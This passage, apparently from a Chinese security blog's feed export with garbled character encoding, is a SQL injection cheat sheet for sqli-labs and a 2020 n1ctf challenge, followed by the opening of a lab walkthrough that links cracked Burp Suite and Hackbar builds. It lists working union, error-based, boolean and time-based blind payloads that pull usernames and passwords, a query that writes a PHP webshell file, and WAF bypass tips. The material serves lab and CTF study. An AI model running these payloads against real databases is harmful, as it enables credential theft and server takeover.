class="hljs-meta">%</span><span class="bash"><span class="hljs-string">&quot;</span></span><br><span class="hljs-meta">%</span><span class="bash"><span class="hljs-string">&quot;)</span></span><br><span class="hljs-meta">%</span><span class="bash">`</span><br><span class="hljs-meta">%</span><span class="bash">`)</span><br><span class="hljs-meta">%</span><span class="bash">`))</span><br><br></code></pre></td></tr></table></figure><h2 id="2-2-ä¸¤ä¾§é—­åˆå‹"><a href="#2-2-ä¸¤ä¾§é—­åˆå‹" class="headerlink" title="2.2 ä¸¤ä¾§é—­åˆå‹"></a>2.2 ä¸¤ä¾§é—­åˆå‹</h2><p>insertæ— æ³•ç›´æ¥å›æ˜¾</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br>?id=<span class="hljs-number">1</span>&#x27;&amp;&amp;sleep(<span class="hljs-number">3</span>)&amp;&amp;&#x27;<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><h2 id="2-3-Order-byå‹"><a href="#2-3-Order-byå‹" class="headerlink" title="2.3 Order byå‹"></a>2.3 Order byå‹</h2><p>éªŒè¯æ˜¯å¦å­˜åœ¨</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs perl"><br><span class="hljs-comment"># å‡åºæ’åº</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> asc<br><span class="hljs-comment"># é™åºæ’åº</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> desc<br><br><span class="hljs-comment"># rand() éªŒè¯</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">rand</span>(true)<br>?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">rand</span>(false)<br><br><span class="hljs-comment"># å»¶æ—¶éªŒè¯</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">sleep</span>(<span class="hljs-number">1</span>)<br>?<span class="hljs-keyword">sort</span>=(<span class="hljs-keyword">sleep</span>(<span class="hljs-number">1</span>))<br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">1</span>)<br><br></code></pre></td></tr></table></figure><p>å¸¸è§åˆ©ç”¨æ–¹å¼</p><ul><li>æŠ¥é”™æ³¨å…¥</li><li>å¸ƒå°”æ³¨å…¥</li><li>å»¶æ—¶æ³¨å…¥<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment"># æŠ¥é”™1</span><br>?sort=1+AND+(<span class="hljs-keyword">SELECT</span>+<span class="hljs-number">1</span>+<span class="hljs-keyword">FROM</span>+(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">COUNT</span>(*),<span class="hljs-keyword">CONCAT</span>((<span class="hljs-keyword">SELECT</span>(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">CONCAT</span>(<span class="hljs-keyword">CAST</span>(<span class="hljs-keyword">CONCAT</span>(username,<span class="hljs-keyword">password</span>)+<span class="hljs-keyword">AS</span>+<span class="hljs-built_in">CHAR</span>),<span class="hljs-number">0x7e</span>))+<span class="hljs-keyword">FROM</span>+<span class="hljs-keyword">users</span>+<span class="hljs-keyword">LIMIT</span>+<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-keyword">FLOOR</span>(<span class="hljs-keyword">RAND</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x+<span class="hljs-keyword">FROM</span>+INFORMATION_SCHEMA.TABLES+<span class="hljs-keyword">GROUP</span>+<span class="hljs-keyword">BY</span>+x)a)<br><br><span class="hljs-comment"># æŠ¥é”™2</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">procedure</span> analyse(extractvalue(<span class="hljs-keyword">rand</span>(),<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">version</span>())),<span class="hljs-number">1</span>)<br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">procedure</span> analyse(extractvalue(<span class="hljs-keyword">rand</span>(),<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">CONCAT_WS</span>(<span class="hljs-string">&#x27;:&#x27;</span>,username,<span class="hljs-keyword">password</span>)+<span class="hljs-keyword">FROM</span>+<span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>))),<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># å¸ƒå°”æ³¨å…¥</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">rand</span>(<span class="hljs-keyword">left</span>(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;r&#x27;</span>)<br>?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">rand</span>(<span class="hljs-keyword">left</span>(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;s&#x27;</span>)<br><br><span class="hljs-comment"># å»¶æ—¶æ³¨å…¥</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">rand</span>(<span class="hljs-keyword">if</span>(<span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">substr</span>(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">114</span>,<span class="hljs-number">1</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">1</span>)))<br>?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">rand</span>(<span class="hljs-keyword">if</span>(<span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">substr</span>(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">115</span>,<span class="hljs-number">1</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">1</span>)))<br><br><span class="hljs-comment"># å†™webshell</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> <span class="hljs-string">&quot;/var/www/html/less46.txt&quot;</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> <span class="hljs-string">&quot;/Users/littlechieh6/Documents/project/sqli-labs-php7/less46.php&quot;</span> <span class="hljs-keyword">lines</span> <span class="hljs-keyword">terminated</span> <span class="hljs-keyword">by</span> <span class="hljs-number">0x3c3f70687020706870696e666f28293b3f3e</span><br><br></code></pre></td></tr></table></figure></li></ul><h1 id="3-æŒ‰å›æ˜¾ç±»å‹"><a href="#3-æŒ‰å›æ˜¾ç±»å‹" class="headerlink" title="3 æŒ‰å›æ˜¾ç±»å‹"></a>3 æŒ‰å›æ˜¾ç±»å‹</h1><h2 id="3-1-è”åˆæ³¨å…¥"><a href="#3-1-è”åˆæ³¨å…¥" class="headerlink" title="3.1 è”åˆæ³¨å…¥"></a>3.1 è”åˆæ³¨å…¥</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment">-- åˆ¤æ–­å­—æ®µæ•°ç›®</span><br>order by 1<br><br><span class="hljs-comment">-- è”åˆæŸ¥è¯¢æ”¶é›†ä¿¡æ¯</span><br>union <span class="hljs-keyword">select</span> <br><span class="hljs-comment">-- æŸ¥è¯¢å½“å‰æ•°æ®åº“</span><br><span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">database</span>() <br><span class="hljs-comment">-- æŸ¥è¯¢æ‰€æœ‰æ•°æ®åº“</span><br><span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata <br><span class="hljs-comment">-- æŸ¥è¯¢è¡¨å</span><br><span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <br><span class="hljs-comment">-- æŸ¥è¯¢åˆ—å</span><br><span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> <br><span class="hljs-comment">-- æŸ¥è¯¢å­—æ®µå€¼</span><br><span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">id</span>,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <br><br></code></pre></td></tr></table></figure><h2 id="3-2-æŠ¥é”™æ³¨å…¥"><a href="#3-2-æŠ¥é”™æ³¨å…¥" class="headerlink" title="3.2 æŠ¥é”™æ³¨å…¥"></a>3.2 æŠ¥é”™æ³¨å…¥</h2><p>æŠ¥é”™æ³¨å…¥å¸¸è§çš„å‡ ç§ç±»å‹ï¼š</p><ol><li>BIGINTç­‰æ•°æ®ç±»å‹æº¢å‡º</li><li>xpathè¯­æ³•é”™è¯¯</li><li>concat+rand()+group_by()å¯¼è‡´ä¸»é”®é‡å¤</li><li>ä¸€äº›ç‰¹æ€§</li></ol><p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/253?spm=5176.12901015.0.i12901015.7bc1525cu9mqBM&accounttraceid=0e789a5d27b94462a64cd6d053faaab4tmnn">MYSQLæŠ¥é”™æ³¨å…¥çš„ä¸€ç‚¹æ€»ç»“-å…ˆçŸ¥ç¤¾åŒº</a></p><ul><li><p>æ•°æ®æº¢å‡º</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-keyword">select</span> ~<span class="hljs-number">0</span>+<span class="hljs-number">1</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">exp</span>(<span class="hljs-number">709</span>);<br><span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span>(!x-~<span class="hljs-number">0</span>)<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())x)a);<br><br></code></pre></td></tr></table></figure></li><li><p>xpathè¯­æ³•é”™è¯¯</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> @@<span class="hljs-keyword">version</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>);<br><span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> @@<span class="hljs-keyword">version</span>),<span class="hljs-number">0x7e</span>));<br><br></code></pre></td></tr></table></figure></li></ul><h2 id="3-3-å¸ƒå°”æ³¨å…¥"><a href="#3-3-å¸ƒå°”æ³¨å…¥" class="headerlink" title="3.3 å¸ƒå°”æ³¨å…¥"></a>3.3 å¸ƒå°”æ³¨å…¥</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br><span class="hljs-number">1.</span> è·å–å½“å‰æ•°æ®åº“é•¿åº¦<br><span class="hljs-number">1</span>&quot; and length(database())&gt;= 11 #ï¼ˆï¼‰<br><br>2. è·å–å½“å‰æ•°æ®åº“åå­—<br>1&quot; <span class="hljs-keyword">and</span> substr(<span class="hljs-keyword">database</span>(), <span class="hljs-number">11</span>, <span class="hljs-number">1</span>)=&quot;e&quot; #<br><br><span class="hljs-number">3.</span> è·å–åº“è¡¨çš„æ€»æ•°ï¼ˆè¿˜å¯ä»¥ä½¿ç”¨lengthï¼‰<br><span class="hljs-number">1</span>&quot; and (select count(table_name) from information_schema.tables where table_schema=database()) &gt;= 3 #<br><br>4. è·å–åº“è¡¨çš„é•¿åº¦<br>1&quot; <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> length(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) &gt;=<span class="hljs-number">0</span> #<br><br><span class="hljs-number">5.</span> è·å–åº“è¡¨çš„åå­—<br><span class="hljs-number">1</span>&quot; and substr((select table_name from information_schema.tables where table_schema=database() limit 2,1), &#123;pos&#125;, 1)=&quot;&#123;c&#125;&quot; #<br><br>6. è·å–åº“è¡¨çš„å­—æ®µæ€»æ•°<br>1&quot; <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> count(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=&quot;the_cfg&quot;) &gt;= <span class="hljs-number">2</span> #<br><br><span class="hljs-number">7.</span> è·å–åº“è¡¨çš„å­—æ®µç¬¬<span class="hljs-number">2</span>ä¸ªé•¿åº¦<br><span class="hljs-number">1</span>&quot; and length((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;the_cfg&quot; limit 0,1)) &gt;= 0 #<br><br>8. è·å–åº“è¡¨çš„å­—æ®µç¬¬Nä¸ªå­—æ®µå<br>1&quot; <span class="hljs-keyword">and</span> substr((<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=&quot;the_cfg&quot; <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>), &#123;pos&#125;, <span class="hljs-number">1</span>)=&quot;&#123;c&#125;&quot; #<br><br><span class="hljs-number">9.</span> è·å–å†…å®¹<br><span class="hljs-number">1</span>&quot; and substr((select cfg_value from the_cfg limit 0,1), &#123;pos&#125;, 1)=&quot;&#123;c&#125;&quot; #<br>æ³¨æ„ï¼šsubstr(str,pos,len);éœ€è¦æ³¨æ„çš„æ˜¯ï¼šå¦‚æœ pos ä¸º 1(è€Œä¸æ˜¯0)ï¼Œè¡¨ç¤ºä»ç¬¬ä¸€ä¸ªä½ç½®å¼€å§‹ã€‚<br>limit pos,len ï¼šä» 0 å¼€å§‹ï¼Œåé¢çš„ len ä»£è¡¨é•¿åº¦<br><br></code></pre></td></tr></table></figure><h2 id="3-4-æ—¶é—´ç›²æ³¨"><a href="#3-4-æ—¶é—´ç›²æ³¨" class="headerlink" title="3.4 æ—¶é—´ç›²æ³¨"></a>3.4 æ—¶é—´ç›²æ³¨</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment"># SLEEP</span><br><span class="hljs-keyword">select</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>);<br><span class="hljs-comment"># BENCHMARK</span><br><span class="hljs-keyword">select</span> <span class="hljs-keyword">benchmark</span>(<span class="hljs-number">10000000</span>,<span class="hljs-keyword">sha</span>(<span class="hljs-number">1</span>));<br><span class="hljs-comment"># ç¬›å¡å°”ç§¯</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">count</span>(*) <span class="hljs-keyword">FROM</span> information_schema.columns A, information_schema.columns B, information_schema.tables C;<br><span class="hljs-comment"># GET_LOCK</span><br><span class="hljs-keyword">select</span> <span class="hljs-keyword">get_lock</span>(<span class="hljs-string">&#x27;test&#x27;</span>,<span class="hljs-number">5</span>);<br><span class="hljs-comment"># RLIKE</span><br><span class="hljs-keyword">select</span> rpad(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">4999999</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-keyword">RLIKE</span> <span class="hljs-keyword">concat</span>(<span class="hljs-keyword">repeat</span>(<span class="hljs-string">&#x27;(a.*)+&#x27;</span>,<span class="hljs-number">30</span>),<span class="hljs-string">&#x27;b&#x27;</span>);<br><br></code></pre></td></tr></table></figure><h1 id="4-WAFç»•è¿‡"><a href="#4-WAFç»•è¿‡" class="headerlink" title="4 WAFç»•è¿‡"></a>4 WAFç»•è¿‡</h1><ol><li>åŒå†™</li><li>ç‰¹æ®Šç¬¦å·:å¦‚ï¼š%0b</li><li>å®½å­—èŠ‚</li><li>ä¸¤ç«¯é—­åˆ</li></ol><h1 id="å®æˆ˜"><a href="#å®æˆ˜" class="headerlink" title="å®æˆ˜"></a>å®æˆ˜</h1><p>2020 å¹´ n1ctf ä¸­ Web-SignIn ä¸€é¢˜ä¸­ç”¨åˆ°çš„ SQL è¯­å¥ã€‚ä½¿ç”¨çš„æŠ¥é”™å‡½æ•°ä¸ <code>exp()</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment"># æŸ¥è¯¢æ•°æ®åº“åå­—</span><br>database()<br><br><span class="hljs-comment"># æŸ¥è¯¢æ•°æ®åº“ä¿¡æ¯</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">concat</span>(<span class="hljs-keyword">version</span>(),<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-number">0x3a</span>,@@datadir,<span class="hljs-number">0x3a</span>,@@version_compile_os)<br><br><span class="hljs-comment"># æŸ¥è¯¢æ–‡ä»¶è¯»å–æƒé™</span><br><span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">user</span>,<span class="hljs-number">0x3a</span>,file_priv) <span class="hljs-keyword">from</span> mysql.user<br><br><span class="hljs-comment"># æŸ¥è¯¢å½“å‰ç”¨æˆ·</span><br><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()<br><br><span class="hljs-comment"># æŸ¥è¯¢æ•°æ®åº“ç‰ˆæœ¬</span><br><span class="hljs-keyword">version</span>()<br><br><span class="hljs-comment"># æŸ¥è¯¢è¡¨åçš„é•¿åº¦</span><br><span class="hljs-keyword">select</span> <span class="hljs-keyword">length</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;n1ctf_websign&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span><br><br><span class="hljs-comment"># æŸ¥è¯¢è¡¨åï¼ˆä¿®æ”¹åé¢çš„ limitï¼‰</span><br><span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">DATABASE</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span><br><br><span class="hljs-comment"># åˆ¤æ–­å­—æ®µåï¼ˆä¿®æ”¹åé¢çš„ limitï¼‰</span><br><span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> table_name=<span class="hljs-string">&#x27;n1key&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>ã€‚<br><br><span class="hljs-comment"># æŸ¥è¯¢ ip è¡¨ã€‚ï¼ˆè¾¹æ’å…¥è¾¹æŸ¥è¯¢ï¼Œéœ€è¦ä½¿ç”¨åˆ«åï¼‰</span><br><span class="hljs-keyword">SELECT</span> tid <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">select</span> ip tid <span class="hljs-keyword">from</span> n1ip <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) <span class="hljs-keyword">AS</span> tt<br><br><span class="hljs-comment"># æŸ¥è¯¢æŸä¸ªå­—æ®µçš„æ•°æ®ï¼ˆkey ä¸æ•°æ®åº“çš„å…³é”®è¯ç›¸å†²çªï¼Œéœ€è¦ä½¿ç”¨åˆ«åï¼‰</span><br><span class="hljs-keyword">select</span> <span class="hljs-keyword">GROUP_CONCAT</span>(<span class="hljs-keyword">id</span>) <span class="hljs-keyword">FROM</span> n1key<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(bb.key) <span class="hljs-keyword">from</span> n1key bb<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">key</span>) <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> n1key) <span class="hljs-keyword">as</span> a<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">id</span> <span class="hljs-keyword">from</span> n1key <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><span class="hljs-comment"># ä¸ä½¿ç”¨å­—æ®µååº¦å€¼</span><br><span class="hljs-keyword">SELECT</span> a<span class="hljs-number">.2</span> <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>, <span class="hljs-number">2</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> n1key<br><br><span class="hljs-comment"># åˆ¤æ–­æ˜¯å¦æœ‰æ•°æ®</span><br><span class="hljs-keyword">SELECT</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">key</span> <span class="hljs-keyword">FROM</span> n1key) <span class="hljs-keyword">IS</span> <span class="hljs-literal">NULL</span><br><br><span class="hljs-comment"># æŸ¥è¯¢æ–‡ä»¶</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">LOAD_FILE</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>)<br><br></code></pre></td></tr></table></figure><h1 id="é™„å½•"><a href="#é™„å½•" class="headerlink" title="é™„å½•"></a>é™„å½•</h1><p>å‚è€ƒæ–‡æ¡£ï¼š</p><ol><li><a href="https://3wapp.github.io/WebSecurity/mysqlinject.html">Mysql æ³¨å…¥-wiki</a></li><li><a href="https://blog.csdn.net/qq_43085611/article/details/112661431">sqli-labs(å…¨é€šå…³åˆ·é¢˜ç¬”è®°)-slug01sh</a></li><li><a href="https://www.onebug.org/websafe/75808.html">Onebug.org | å®‰å…¨é˜²çº¿</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>å®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sqlæ³¨å…¥</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs(å…¨é€šå…³åˆ·é¢˜ç¬”è®°)</title>
    <link href="/2021/01/11/2021%E5%B9%B41%E6%9C%8811%E6%97%A5-sqli-labs-%E5%85%A8%E9%80%9A%E5%85%B3%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    <url>/2021/01/11/2021%E5%B9%B41%E6%9C%8811%E6%97%A5-sqli-labs-%E5%85%A8%E9%80%9A%E5%85%B3%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="1-å‡†å¤‡å·¥ä½œ"><a href="#1-å‡†å¤‡å·¥ä½œ" class="headerlink" title="1 å‡†å¤‡å·¥ä½œ"></a>1 å‡†å¤‡å·¥ä½œ</h1><p>å›½å…‰å¸ˆå‚…å¤ªå¼ºäº†ï¼Œå‡†å¤‡å†™ sqli-labs çš„åšå®¢ï¼Œå‘ç°å›½å…‰å¸ˆå‚…å·²ç»å†™è¿‡äº†ã€‚ä¸è¿‡ä¿ºçš„æ€è·¯è¿˜æ˜¯æœ‰ä¸€äº›ä¸åŒä¹‹å¤„ã€‚</p><ul><li>Sqli-labs ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/skyblueee/sqli-labs-php7%E3%80%82">https://github.com/skyblueee/sqli-labs-php7ã€‚</a><blockquote><p>é€šå¸¸ä¸‹è½½ Sqli-labs æ—¶ï¼Œä¼šä¸‹è½½åˆ°æœ€åˆçš„é‚£ä¸ª sqli-labsï¼Œä½†æ˜¯å¹¶ä¸é€‚ç”¨äºPHP7ã€‚</p></blockquote></li><li>Burp Suite ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/TrojanAZhen/BurpSuitePro-2.1">https://github.com/TrojanAZhen/BurpSuitePro-2.1</a></li><li>Hackbar ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/ox01024/hackbar_crack">https://github.com/ox01024/hackbar_crack</a></li><li>Navicatï¼šå¯ä»¥ç”¨æ¥å†™ SQL è¯­å¥ï¼Œæœ‰è‡ªåŠ¨è¡¥å…¨åŠŸèƒ½ã€‚</li></ul><p>æˆ‘ä½¿ç”¨VScodeæ¥è¿è¡Œ sql-labsï¼Œå›½å…‰å¸ˆå‚…ä½¿ç”¨çš„æ˜¯ Docker å®‰è£…ã€‚å¯¹äºæˆ‘è¿™ç§èœé¸¡ï¼Œè¿˜æ˜¯å…ˆé‡‡ç”¨å¤æ‚çš„æ–¹æ³•å§ã€‚</p><h1 id="2-åŸºç¡€æŒ‘æˆ˜-1-20"><a href="#2-åŸºç¡€æŒ‘æˆ˜-1-20" class="headerlink" title="2 åŸºç¡€æŒ‘æˆ˜(1-20)"></a>2 åŸºç¡€æŒ‘æˆ˜(1-20)</h1><h2 id="less-1"><a href="#less-1" class="headerlink" 